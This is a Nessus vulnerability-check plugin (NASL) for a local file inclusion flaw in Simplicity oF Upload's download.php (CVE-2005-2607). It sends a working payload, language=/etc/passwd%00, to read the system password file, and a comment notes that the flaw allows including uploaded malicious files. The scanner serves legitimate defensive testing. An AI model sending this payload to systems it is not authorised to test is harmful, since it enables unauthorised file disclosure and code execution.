#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(19334);
  script_version("$Revision: 1.18 $");

  script_cve_id("CVE-2005-2607");
  script_bugtraq_id(14424);
  script_osvdb_id(18467);

  script_name(english:"Simplicity oF Upload download.php language Parameter Local File Inclusion");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that suffers from a
remote file include issue." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Simplicity oF Upload, a free PHP script to
manage file uploads. 

The version of Simplicity oF Upload installed on the remote host fails
to sanitize user-supplied input to the 'language' parameter of the
'download.php' script.  By leveraging this flaw, an attacker may be
able to view arbitrary files on the remote host and execute arbitrary
PHP code, possibly contained in files uploaded using the affected
application itself." );
 script_set_attribute(attribute:"see_also", value:"http://retrogod.altervista.org/simply.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.phpsimplicity.com/scripts.php?id=3" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Simplicity oF Upload version 1.3.1 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/08/01");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/07/26");
 script_cvs_date("$Date: 2012/12/19 23:15:39 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:phpsimplicity:simplicity_of_upload");
script_end_attributes();

 
  script_summary(english:"Checks for language parameter file include vulnerability in Simplicity oF Upload");
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2012 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit the flaw to read /etc/passwd.
  w = http_send_recv3(method:"GET", 
    item:string(
      dir, "/download.php?",
      "language=/etc/passwd%00"
    ), 
    port:port
  );
  if (isnull(w)) exit(1, "The web server on port "+port+" did not answer.");
  res = w[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # we get an error saying "Failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but one could
    #     still upload a malicious file and then reference that here.
    "Failed opening required '/etc/passwd" >< res )
   {
    security_hole(port);
    exit(0);
  }
}
